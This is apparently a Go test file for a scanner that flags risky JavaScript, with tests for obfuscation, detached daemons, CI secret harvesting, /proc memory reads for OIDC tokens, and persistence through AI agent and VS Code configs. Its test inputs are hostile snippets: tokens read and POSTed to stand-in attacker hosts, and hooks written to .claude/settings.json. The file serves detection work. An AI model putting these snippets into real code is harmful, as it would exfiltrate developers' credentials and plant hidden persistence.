package jsrisk

import (
	"context"
	"strings"
	"testing"

	"github.com/garagon/aguara/internal/scanner"
	"github.com/garagon/aguara/internal/types"
)

func analyze(t *testing.T, relPath, content string) []types.Finding {
	t.Helper()
	a := New()
	target := &scanner.Target{
		Path:    relPath,
		RelPath: relPath,
		Content: []byte(content),
	}
	findings, err := a.Analyze(context.Background(), target)
	if err != nil {
		t.Fatalf("Analyze returned error: %v", err)
	}
	return findings
}

func hasRule(findings []types.Finding, ruleID string) bool {
	for _, f := range findings {
		if f.RuleID == ruleID {
			return true
		}
	}
	return false
}

func findRule(findings []types.Finding, ruleID string) *types.Finding {
	for i := range findings {
		if findings[i].RuleID == ruleID {
			return &findings[i]
		}
	}
	return nil
}

// --- target gating ---

func TestIsJavaScriptTarget(t *testing.T) {
	cases := []struct {
		path string
		want bool
	}{
		{"script.js", true},
		{"module.mjs", true},
		{"common.cjs", true},
		{"sub/script.JS", true},
		{"/repo/index.js", true},
		{"script.ts", false},
		{"script.json", false},
		{"package.json", false},
		{"README.md", false},
	}
	for _, c := range cases {
		got := isJavaScriptTarget(&scanner.Target{Path: c.path, RelPath: c.path})
		if got != c.want {
			t.Errorf("isJavaScriptTarget(%q) = %v, want %v", c.path, got, c.want)
		}
	}
}

func TestAnalyzer_NonJSFile(t *testing.T) {
	findings := analyze(t, "package.json", `{}`)
	if len(findings) != 0 {
		t.Fatalf("expected no findings for non-JS target, got %d", len(findings))
	}
}

// --- JS_OBF_001 ---

func TestSafe_PlainScript(t *testing.T) {
	findings := analyze(t, "hello.js", `console.log("hello, world");`)
	if hasRule(findings, RuleObfuscation) {
		t.Errorf("plain script must not trigger JS_OBF_001, got: %+v", findings)
	}
}

func TestSafe_MinifiedVendorBundleNoObfSignal(t *testing.T) {
	// Large file, long single line, but no hex identifiers / dispatcher
	// calls / while(!![]). Must not trigger.
	body := strings.Repeat("var foo=function(a,b){return a+b;};", 20000) // ~700KB, single line if no newlines
	findings := analyze(t, "vendor.js", body)
	if hasRule(findings, RuleObfuscation) {
		t.Errorf("minified vendor bundle without obfuscator signals must not trigger JS_OBF_001, got: %+v", findings)
	}
}

func TestVuln_Obfuscation_HexIdentifiersAndWhileTrue(t *testing.T) {
	// 200 _0xNNNN references plus while(!![]) is two obfuscator-specific
	// signals — well above the threshold for JS_OBF_001.
	body := strings.Repeat("var _0xabcd=1;", 200) + "\nwhile(!![]){console.log('a');}\n"
	findings := analyze(t, "payload.js", body)
	f := findRule(findings, RuleObfuscation)
	if f == nil {
		t.Fatalf("expected JS_OBF_001, got: %+v", findings)
	}
	if f.Severity != types.SeverityMedium {
		t.Errorf("obfuscation-only chain should be MEDIUM, got %v", f.Severity)
	}
}

func TestVuln_Obfuscation_EscalatesWithProcessEnv(t *testing.T) {
	body := strings.Repeat("var _0xabcd=1;", 200) + "\nwhile(!![]){var x=process.env.GITHUB_TOKEN;}\n"
	findings := analyze(t, "payload.js", body)
	f := findRule(findings, RuleObfuscation)
	if f == nil {
		t.Fatalf("expected JS_OBF_001, got: %+v", findings)
	}
	if f.Severity != types.SeverityHigh {
		t.Errorf("obfuscation + process.env should be HIGH, got %v", f.Severity)
	}
}

// --- JS_DAEMON_001 ---

func TestSafe_NormalSpawn(t *testing.T) {
	body := `const { spawn } = require('child_process'); spawn('ls', ['-l']);`
	findings := analyze(t, "ok.js", body)
	if hasRule(findings, RuleDaemon) {
		t.Errorf("normal spawn must not trigger JS_DAEMON_001, got: %+v", findings)
	}
}

func TestVuln_Daemon_DetachedIgnoreStdio(t *testing.T) {
	body := `
const cp = require('child_process');
const child = cp.spawn('node', ['./payload.js'], { detached: true, stdio: 'ignore' });
child.unref();
`
	findings := analyze(t, "daemon.js", body)
	f := findRule(findings, RuleDaemon)
	if f == nil {
		t.Fatalf("expected JS_DAEMON_001, got: %+v", findings)
	}
	if f.Severity != types.SeverityHigh {
		t.Errorf("daemon shape alone should be HIGH, got %v", f.Severity)
	}
}

func TestVuln_Daemon_EscalatesWithSecretAccess(t *testing.T) {
	body := `
const cp = require('child_process');
const tok = process.env.GITHUB_TOKEN;
fetch('https://attacker/x', {method:'POST', body:tok});
const child = cp.spawn('node', ['./payload.js'], { detached: true, stdio: 'ignore' });
child.unref();
`
	findings := analyze(t, "daemon2.js", body)
	f := findRule(findings, RuleDaemon)
	if f == nil {
		t.Fatalf("expected JS_DAEMON_001, got: %+v", findings)
	}
	if f.Severity != types.SeverityCritical {
		t.Errorf("daemon + secret/network should be CRITICAL, got %v", f.Severity)
	}
}

func TestSafe_DetachedFalseDoesNotTrigger(t *testing.T) {
	body := `const child = require('child_process').spawn('ls', [], { detached: false, stdio: 'ignore' });`
	findings := analyze(t, "x.js", body)
	if hasRule(findings, RuleDaemon) {
		t.Errorf("detached:false must not trigger daemon, got: %+v", findings)
	}
}

// --- JS_CI_SECRET_HARVEST_001 ---

func TestSafe_SecretReadWithoutSink(t *testing.T) {
	body := `if (process.env.GITHUB_TOKEN) { console.log('have token'); }`
	findings := analyze(t, "x.js", body)
	if hasRule(findings, RuleCISecretHarvest) {
		t.Errorf("secret read without sink must not trigger harvest, got: %+v", findings)
	}
}

func TestVuln_CISecretHarvest_TokenAndFetch(t *testing.T) {
	body := `
const t = process.env.GITHUB_TOKEN;
fetch('https://attacker.example/exfil', {method:'POST', body: t});
`
	findings := analyze(t, "h.js", body)
	f := findRule(findings, RuleCISecretHarvest)
	if f == nil {
		t.Fatalf("expected JS_CI_SECRET_HARVEST_001, got: %+v", findings)
	}
	if f.Severity != types.SeverityCritical {
		t.Errorf("harvest should be CRITICAL, got %v", f.Severity)
	}
	if !strings.Contains(f.MatchedText, "GITHUB_TOKEN") {
		t.Errorf("MatchedText should mention the secret name, got %q", f.MatchedText)
	}
}

func TestVuln_CISecretHarvest_NpmRegistrySink(t *testing.T) {
	body := `
const t = process.env.NPM_TOKEN;
require('https').request('https://registry.npmjs.org/-/npm/v1/tokens', {method:'PUT'});
`
	findings := analyze(t, "p.js", body)
	if !hasRule(findings, RuleCISecretHarvest) {
		t.Errorf("npm registry sink with NPM_TOKEN should trigger harvest, got: %+v", findings)
	}
}

func TestVuln_CISecretHarvest_GitHubGraphQLSink(t *testing.T) {
	body := `
const t = process.env.GITHUB_TOKEN;
fetch('https://api.github.com/graphql', {method:'POST', headers:{Authorization:'Bearer '+t}, body:'{createCommitOnBranch}'});
`
	findings := analyze(t, "g.js", body)
	if !hasRule(findings, RuleCISecretHarvest) {
		t.Errorf("GitHub graphql + token should trigger harvest, got: %+v", findings)
	}
}

func TestVuln_CISecretHarvest_SessionExfilSink(t *testing.T) {
	body := `
const t = process.env.AWS_SECRET_ACCESS_KEY;
fetch('https://filev2.getsession.org/', {method:'POST', body:t});
`
	findings := analyze(t, "s.js", body)
	if !hasRule(findings, RuleCISecretHarvest) {
		t.Errorf("session exfil endpoint should trigger harvest, got: %+v", findings)
	}
}

// --- JS_PROC_MEM_OIDC_001 ---

func TestSafe_ProcOnlyNoOIDC(t *testing.T) {
	body := `const cpu = require('fs').readFileSync('/proc/stat');`
	findings := analyze(t, "x.js", body)
	if hasRule(findings, RuleProcMemOIDC) {
		t.Errorf("/proc/stat read without OIDC must not trigger ProcMemOIDC, got: %+v", findings)
	}
}

func TestVuln_ProcMemOIDC_TokenEnv(t *testing.T) {
	body := `
const fs = require('fs');
const dir = fs.readdirSync('/proc');
for (const pid of dir) {
  const mem = fs.readFileSync('/proc/' + pid + '/mem');
  if (mem.includes(process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN)) {
    fetch('https://attacker/x', {method:'POST', body: mem});
  }
}
`
	findings := analyze(t, "scan.js", body)
	f := findRule(findings, RuleProcMemOIDC)
	if f == nil {
		t.Fatalf("expected JS_PROC_MEM_OIDC_001, got: %+v", findings)
	}
	if f.Severity != types.SeverityCritical {
		t.Errorf("proc mem + OIDC must be CRITICAL, got %v", f.Severity)
	}
}

func TestVuln_ProcMemOIDC_RunnerWorker(t *testing.T) {
	body := `
const maps = require('fs').readFileSync('/proc/self/maps');
if (maps.includes('Runner.Worker')) { /* pivot */ }
`
	findings := analyze(t, "r.js", body)
	if !hasRule(findings, RuleProcMemOIDC) {
		t.Errorf("/proc + Runner.Worker should trigger, got: %+v", findings)
	}
}

// --- AGENT_PERSISTENCE_001 ---

func TestSafe_DocumentationMention(t *testing.T) {
	// A literal /* .claude/settings.json */ inside a code comment in an
	// unrelated tool should still flag because the analyzer cannot know
	// it is a comment. We do not promise to skip comments. Just verify
	// the rule fires consistently on the path mention.
	body := `console.log("hello");`
	findings := analyze(t, "x.js", body)
	if hasRule(findings, RuleAgentPersistence) {
		t.Errorf("script with no agent-path mention must not trigger, got: %+v", findings)
	}
}

func TestVuln_AgentPersistence_ClaudeSettings(t *testing.T) {
	body := `
const fs = require('fs');
fs.writeFileSync(process.env.HOME + '/.claude/settings.json', '{"hooks":{}}');
`
	findings := analyze(t, "ap.js", body)
	f := findRule(findings, RuleAgentPersistence)
	if f == nil {
		t.Fatalf("expected AGENT_PERSISTENCE_001, got: %+v", findings)
	}
	if f.Severity != types.SeverityHigh {
		t.Errorf("agent persistence alone should be HIGH, got %v", f.Severity)
	}
}

func TestVuln_AgentPersistence_VSCodeRunOnFolderOpen(t *testing.T) {
	body := `
require('fs').writeFileSync('.vscode/tasks.json', JSON.stringify({
  tasks: [{label: 'init', command: 'node setup.mjs', runOn: 'folderOpen'}]
}));
`
	findings := analyze(t, "v.js", body)
	if !hasRule(findings, RuleAgentPersistence) {
		t.Errorf("expected AGENT_PERSISTENCE_001 for VS Code folderOpen, got: %+v", findings)
	}
}

func TestVuln_AgentPersistence_EscalatesWithSecretHarvest(t *testing.T) {
	body := `
const t = process.env.GITHUB_TOKEN;
fetch('https://attacker/x', {method:'POST', body:t});
require('fs').writeFileSync(process.env.HOME + '/.claude/settings.json', '{}');
`
	findings := analyze(t, "ap2.js", body)
	f := findRule(findings, RuleAgentPersistence)
	if f == nil {
		t.Fatalf("expected AGENT_PERSISTENCE_001, got: %+v", findings)
	}
	if f.Severity != types.SeverityCritical {
		t.Errorf("persistence + secret harvest must be CRITICAL, got %v", f.Severity)
	}
}

// --- finding shape regression ---

func TestFindingsHaveStableFields(t *testing.T) {
	body := `
const t = process.env.GITHUB_TOKEN;
fetch('https://attacker/x', {method:'POST', body:t});
require('fs').writeFileSync(process.env.HOME + '/.claude/settings.json', '{}');
const cp = require('child_process');
const c = cp.spawn('node', ['x'], {detached: true, stdio: 'ignore'}); c.unref();
const m = require('fs').readFileSync('/proc/self/maps');
if (m.includes(process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN)) {}
`
	findings := analyze(t, "full.js", body)
	if len(findings) == 0 {
		t.Fatalf("expected findings, got none")
	}
	seenLines := map[int]string{}
	for _, f := range findings {
		if f.Analyzer != AnalyzerName {
			t.Errorf("finding %s: analyzer = %q, want %q", f.RuleID, f.Analyzer, AnalyzerName)
		}
		if f.Category != "supply-chain" {
			t.Errorf("finding %s: category = %q, want supply-chain", f.RuleID, f.Category)
		}
		if !strings.HasPrefix(f.RuleID, "JS_") && !strings.HasPrefix(f.RuleID, "AGENT_") {
			t.Errorf("finding ruleID %q should have JS_ or AGENT_ prefix", f.RuleID)
		}
		if f.Confidence == 0 {
			t.Errorf("finding %s: confidence should be > 0", f.RuleID)
		}
		if f.Remediation == "" {
			t.Errorf("finding %s: remediation should be non-empty", f.RuleID)
		}
		if f.Line == 0 {
			t.Errorf("finding %s: line should be > 0", f.RuleID)
		}
		if prev, ok := seenLines[f.Line]; ok {
			t.Logf("two findings on line %d: %s and %s (cross-rule dedup may drop one)", f.Line, prev, f.RuleID)
		}
		seenLines[f.Line] = f.RuleID
	}
}
